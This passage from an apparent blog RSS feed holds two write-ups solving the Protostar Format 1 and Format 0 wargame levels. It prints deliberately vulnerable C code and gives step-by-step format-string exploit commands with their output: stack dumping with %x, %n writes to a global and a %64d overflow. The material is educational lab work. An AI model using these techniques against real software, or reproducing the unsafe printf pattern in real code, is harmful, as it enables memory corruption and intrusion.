&lt;p&gt;Some resources that I&amp;rsquo;ve found greatly useful:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;http://www.amazon.com/gp/product/1593271441/ref=as_li_ss_tl?ie=UTF8&amp;amp;tag=mattandcom-20&amp;amp;linkCode=as2&amp;amp;camp=1789&amp;amp;creative=390957&amp;amp;creativeASIN=1593271441&#34;&gt;Hacking: The Art of Exploitation, 2nd Edition&lt;/a&gt;&lt;img src=&#34;http://www.assoc-amazon.com/e/ir?t=mattandcom-20&amp;l=as2&amp;o=1&amp;a=1593271441&#34; width=&#34;1&#34; height=&#34;1&#34; border=&#34;0&#34; alt=&#34;&#34; style=&#34;border:none !important; margin:0px !important;&#34; /&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://crypto.stanford.edu/cs155/papers/formatstring-1.2.pdf&#34;&gt;Exploiting Format String Vulnerabilities&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://www.securitytube.net/groups?operation=view&amp;amp;groupId=3&#34;&gt;SecurityTube.net Format String Vulnerabilities Megaprimer&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;With this challenge, we&amp;rsquo;re given some c code in which we are to find the vulnerability.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;pre&gt;&lt;code&gt;#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;string.h&amp;gt;

int target;

void vuln(char *string)
{
 printf(string);

 if(target) {
  printf(&amp;quot;you have modified the target :)\n&amp;quot;);
 }
}

int main(int argc, char **argv)
{
 vuln(argv[1]);
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;If you notice, there is a string format vulnerability inside the &amp;ldquo;vuln&amp;rdquo; function.  It is doing a &amp;ldquo;printf&amp;rdquo; of a string directly provided by the user.  To prevent this vulnerability, this line should read:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;printf(&amp;quot;%s&amp;quot;, string);
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The first step of exploiting this vulnerability, would be to find the address of &amp;ldquo;target&amp;rdquo;, so that we can modify it.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ objdump -t format1 | grep target
08049638 g     O .bss   00000004              target
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The next step, is to find the direct reference in the stack to the command argument we enter.  To do this, we can simply spam &amp;ldquo;%x&amp;rdquo;, since that pops the next word off of the stack.  If we do it multiple times, eventually we&amp;rsquo;ll get to where the argument is located.  I chose to do it 150 times, guessing it would be less than that.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ ./format1 AAAAAAAA`perl -e &#39;print &amp;quot;%x.&amp;quot;x150&#39;`
AAAAAAAA804960c.bffff628.8048469.b7fd8304.b7fd7ff4.bffff628.8048435.bffff7f0.b7ff1040.804845b.b7fd7ff4.8048450.0.bffff6a8.b7eadc76.2.bffff6d4.bffff6e0.b7fe1848.bffff690.ffffffff.b7ffeff4.804824d.1.bffff690.b7ff0626.b7fffab0.b7fe1b28.b7fd7ff4.0.0.bffff6a8.8570f76f.af24e17f.0.0.0.2.8048340.0.b7ff6210.b7eadb9b.b7ffeff4.2.8048340.0.8048361.804841c.2.bffff6d4.8048450.8048440.b7ff1040.bffff6cc.b7fff8f8.2.bffff7e6.bffff7f0.0.bffff9bb.bffff9c6.bffff9d6.bffff9f6.bffffa09.bffffa13.bfffff03.bfffff17.bfffff55.bfffff6c.bfffff7d.bfffff85.bfffff95.bfffffa2.bfffffd4.bfffffe0.0.20.b7fe2414.21.b7fe2000.10.febfbff.6.1000.11.64.3.8048034.4.20.5.7.7.b7fe3000.8.0.9.8048340.b.3e9.c.0.d.3e9.e.3e9.17.1.19.bffff7cb.1f.bffffff2.f.bffff7db.0.0.0.cf000000.4b112951.96083d4e.8dce3d07.69b25f71.363836.0.2f2e0000.6d726f66.317461.41414141.41414141.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;If you look at that output, you&amp;rsquo;ll see each byte in the stack, separated by periods.  Eventually, you should see &amp;ldquo;41414141&amp;rdquo;, since the 150 number was enough.  This points to the &amp;ldquo;AAAAAAAA&amp;rdquo; we entered at the beginning of the argument.  I often find it easy to do 8 &amp;ldquo;A&amp;rdquo;s instead of 4, in case the byte is split up, and not aligned properly, giving something like &amp;ldquo;41411234.5678414141&amp;rdquo;.&lt;/p&gt;

&lt;p&gt;Counting in, it looks like it was 128 bytes into the stack to get to.  Just to verify, let&amp;rsquo;s try a little more precisely:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ ./format1 AAAA`perl -e &#39;print &amp;quot;%x.&amp;quot;x128&#39;`%x
AAAA804960c.bffff668.8048469.b7fd8304.b7fd7ff4.bffff668.8048435.bffff834.b7ff1040.804845b.b7fd7ff4.8048450.0.bffff6e8.b7eadc76.2.bffff714.bffff720.b7fe1848.bffff6d0.ffffffff.b7ffeff4.804824d.1.bffff6d0.b7ff0626.b7fffab0.b7fe1b28.b7fd7ff4.0.0.bffff6e8.77ba880e.5dee1e1e.0.0.0.2.8048340.0.b7ff6210.b7eadb9b.b7ffeff4.2.8048340.0.8048361.804841c.2.bffff714.8048450.8048440.b7ff1040.bffff70c.b7fff8f8.2.bffff82a.bffff834.0.bffff9bb.bffff9c6.bffff9d6.bffff9f6.bffffa09.bffffa13.bfffff03.bfffff17.bfffff55.bfffff6c.bfffff7d.bfffff85.bfffff95.bfffffa2.bfffffd4.bfffffe0.0.20.b7fe2414.21.b7fe2000.10.febfbff.6.1000.11.64.3.8048034.4.20.5.7.7.b7fe3000.8.0.9.8048340.b.3e9.c.0.d.3e9.e.3e9.17.1.19.bffff80b.1f.bffffff2.f.bffff81b.0.0.0.3b000000.34e9adc8.e1b8c42b.3212319e.690884e6.363836.0.0.2f2e0000.6d726f66.317461.41414141
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;That verifies that no additional padding needs to be done, the last word is reading perfectly.&lt;/p&gt;

&lt;p&gt;Next, instead of passing &amp;ldquo;AAAA&amp;rdquo; (or 0x41414141) as the address, we&amp;rsquo;ll try using the address of &amp;ldquo;target&amp;rdquo;:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ ./format1 `perl -e &#39;print &amp;quot;\x38\x96\x04\x08&amp;quot; . &amp;quot;%x.&amp;quot;x128&#39;`%x
8804960c.bffff668.8048469.b7fd8304.b7fd7ff4.bffff668.8048435.bffff834.b7ff1040.804845b.b7fd7ff4.8048450.0.bffff6e8.b7eadc76.2.bffff714.bffff720.b7fe1848.bffff6d0.ffffffff.b7ffeff4.804824d.1.bffff6d0.b7ff0626.b7fffab0.b7fe1b28.b7fd7ff4.0.0.bffff6e8.b623f0ae.9c7766be.0.0.0.2.8048340.0.b7ff6210.b7eadb9b.b7ffeff4.2.8048340.0.8048361.804841c.2.bffff714.8048450.8048440.b7ff1040.bffff70c.b7fff8f8.2.bffff82a.bffff834.0.bffff9bb.bffff9c6.bffff9d6.bffff9f6.bffffa09.bffffa13.bfffff03.bfffff17.bfffff55.bfffff6c.bfffff7d.bfffff85.bfffff95.bfffffa2.bfffffd4.bfffffe0.0.20.b7fe2414.21.b7fe2000.10.febfbff.6.1000.11.64.3.8048034.4.20.5.7.7.b7fe3000.8.0.9.8048340.b.3e9.c.0.d.3e9.e.3e9.17.1.19.bffff80b.1f.bffffff2.f.bffff81b.0.0.0.98000000.88091ce4.7be8a4e7.30f01468.69a9fa50.363836.0.0.2f2e0000.6d726f66.317461.8049638
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Note that the initial 0 is missing, but that&amp;rsquo;s ok.  It seems that worked as well, so let&amp;rsquo;s tell it to overwrite the memory address instead of just printing it to the screen:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ ./format1 `perl -e &#39;print &amp;quot;\x38\x96\x04\x08&amp;quot; . &amp;quot;%x.&amp;quot;x128&#39;`%n
8804960c.bffff668.8048469.b7fd8304.b7fd7ff4.bffff668.8048435.bffff834.b7ff1040.804845b.b7fd7ff4.8048450.0.bffff6e8.b7eadc76.2.bffff714.bffff720.b7fe1848.bffff6d0.ffffffff.b7ffeff4.804824d.1.bffff6d0.b7ff0626.b7fffab0.b7fe1b28.b7fd7ff4.0.0.bffff6e8.a61b35ff.8c4fa3ef.0.0.0.2.8048340.0.b7ff6210.b7eadb9b.b7ffeff4.2.8048340.0.8048361.804841c.2.bffff714.8048450.8048440.b7ff1040.bffff70c.b7fff8f8.2.bffff82a.bffff834.0.bffff9bb.bffff9c6.bffff9d6.bffff9f6.bffffa09.bffffa13.bfffff03.bfffff17.bfffff55.bfffff6c.bfffff7d.bfffff85.bfffff95.bfffffa2.bfffffd4.bfffffe0.0.20.b7fe2414.21.b7fe2000.10.febfbff.6.1000.11.64.3.8048034.4.20.5.7.7.b7fe3000.8.0.9.8048340.b.3e9.c.0.d.3e9.e.3e9.17.1.19.bffff80b.1f.bffffff2.f.bffff81b.0.0.0.48000000.eacde3e8.ce402cfb.689377d6.699e12c7.363836.0.0.2f2e0000.6d726f66.317461.you have modified the target :)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;There you have it.  We modified the value, which made the application output &amp;ldquo;you have modified the target :)&amp;rdquo;&lt;/p&gt;

&lt;p&gt;As a bonus solution, I found you can also use Direct Parameter Access, and solve it with a lot less junk on the screen:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ ./format1 `perl -e &#39;print &amp;quot;\x38\x96\x04\x08&amp;quot;&#39;`%128\$n
8you have modified the target :)
&lt;/code&gt;&lt;/pre&gt;
</description>
    </item>
    
    <item>
      <title>Exploit Exercises - Protostar Format 0</title>
      <link>https://www.mattandreko.com/blog/2012-01-24-exploit-exercises-protostar-format-0/</link>
      <pubDate>Tue, 24 Jan 2012 05:13:00 -0500</pubDate>
      
      <guid>https://www.mattandreko.com/blog/2012-01-24-exploit-exercises-protostar-format-0/</guid>
      <description>&lt;p&gt;I&amp;rsquo;ll be honest, I&amp;rsquo;m new to format string exploits.  I&amp;rsquo;ve been more experienced with stack overflows, and a little with heap overflows.  So hopefully this information is correct, as it&amp;rsquo;s from my current understanding.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;&lt;a href=&#34;http://exploit-exercises.com/protostar/format0&#34;&gt;Protostar Format 0&lt;/a&gt; starts us off with the following vulnerable code:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;string.h&amp;gt;

void vuln(char *string)
{
 volatile int target;
 char buffer[64];

 target = 0;

 sprintf(buffer, string);

 if(target == 0xdeadbeef) {
  printf(&amp;quot;you have hit the target correctly :)\n&amp;quot;);
 }
}

int main(int argc, char **argv)
{
 vuln(argv[1]);
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Looking at this code, somehow we have to get the variable, &amp;ldquo;target&amp;rdquo;, which is never set anywhere other than to &amp;ldquo;0&amp;rdquo;, to equal &amp;ldquo;0xdeadbeef&amp;rdquo;.  Luckily, the &amp;ldquo;target&amp;rdquo; variable is on the stack, right before the &amp;ldquo;buffer&amp;rdquo; variable.  That means, if we can overflow &amp;ldquo;buffer&amp;rdquo;, it&amp;rsquo;ll leak out into &amp;ldquo;target&amp;rdquo;. I decided for my understanding, that I would modify the c source file a little, so I could see what was going on better.  I added in 3 additional printf statements.  (This is mainly because I wasn&amp;rsquo;t smart enough to get gdb to tell me where &amp;ldquo;buffer&amp;rdquo; and &amp;ldquo;target&amp;rdquo; were in memory.)&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;string.h&amp;gt;

void vuln(char *string)
{
        volatile int target;
        char buffer[64];

        target = 0;

        sprintf(buffer, string);

        printf(&amp;quot;Target: %08x\n&amp;quot;, target);
        printf(&amp;quot;Address of target: %08x\n&amp;quot;, &amp;amp;target);
        printf(&amp;quot;Address of buffer: %08x\n&amp;quot;, &amp;amp;buffer);

        if(target == 0xdeadbeef) {
                printf(&amp;quot;you have hit the target correctly :)\n&amp;quot;);
        }
}

int main(int argc, char **argv)
{
        vuln(argv[1]);
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Now, when I execute my custom compiled version, it gives me useful information:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:~$ ./format0_1
Target: 00000000
Address of target: bffff7bc
Address of buffer: bffff77c
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Just to verify that there was no spacing after &amp;ldquo;buffer&amp;rdquo; and before &amp;ldquo;target&amp;rdquo;, I took those 2 values, and did some math:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:~$ perl -e &#39;print 0xbffff7bc-0xbffff77c . &amp;quot;\n&amp;quot;&#39;
64
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Initially, I thought this looked a lot like a stack overflow, especially since it did work as one:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ ./format0 `perl -e &#39;print &amp;quot;A&amp;quot;x64 . &amp;quot;\xef\xbe\xad\xde&amp;quot;&#39;`
you have hit the target correctly :)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This is cheating though, since this is to demonstrate format string exploitation, and the &lt;a href=&#34;http://exploit-exercises.com/protostar/format0&#34;&gt;Format 0&lt;/a&gt; page says specifically:&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;&amp;ldquo;This level should be done in less than 10 bytes of input.&amp;rdquo;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;So grumbling that I was going to have to do extra work, I started reading about string format exploitation.  A great document was titled &lt;a href=&#34;http://crypto.stanford.edu/cs155/papers/formatstring-1.2.pdf&#34;&gt;&amp;ldquo;Exploiting Format String Vulnerabilities&amp;rdquo;&lt;/a&gt;, by scut / team teso&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;It was in this document, that I found that you can actually tell the c compiler to read a certain number of bytes into a format.  I had seen this done half a dozen times before, but never knew that&amp;rsquo;s what it was doing.  For example:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;printf(&amp;quot;Target: %08x\n&amp;quot;, target);
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Normally for a hex formatting, you would simply use &amp;ldquo;%x&amp;rdquo; as the placeholder.  Well, apparently if you use &amp;ldquo;%08x&amp;rdquo;, it will format it with 8 hex characters.  This is so that when &amp;ldquo;target&amp;rdquo; is set to 0, it actually prints &amp;ldquo;0x00000000&amp;rdquo; instead of &amp;ldquo;0x0&amp;rdquo;.  Very nice!&lt;/p&gt;

&lt;p&gt;The same works for other types, such as decimal (&amp;ldquo;%d&amp;rdquo;).  Since in the c program, it&amp;rsquo;s doing:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;sprintf(buffer, string);
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;With this code, &amp;ldquo;string&amp;rdquo; is the first argument you pass to the program.  Since sprintf won&amp;rsquo;t stop until it reads a null byte (as in a null terminated string), I just formatted it to read 64 bytes, and then concatenated &amp;ldquo;deadbeef&amp;rdquo; in little endian to it:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ ./format0 `perl -e &#39;print &amp;quot;%64d&amp;quot; . &amp;quot;\xef\xbe\xad\xde&amp;quot;&#39;`
you have hit the target correctly :)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;You could also format it with the &amp;ldquo;%64d&amp;rdquo; not in the perl statement, but I don&amp;rsquo;t think it looks as readable.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ ./format0 %64x`perl -e &#39;print &amp;quot;\xef\xbe\xad\xde&amp;quot;&#39;`
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So there you have it.  That&amp;rsquo;s definitely under 10 bytes of input.  I still have room for 2 more bytes if I need.&lt;/p&gt;
</description>
    </item>
    
  </channel>
</rss>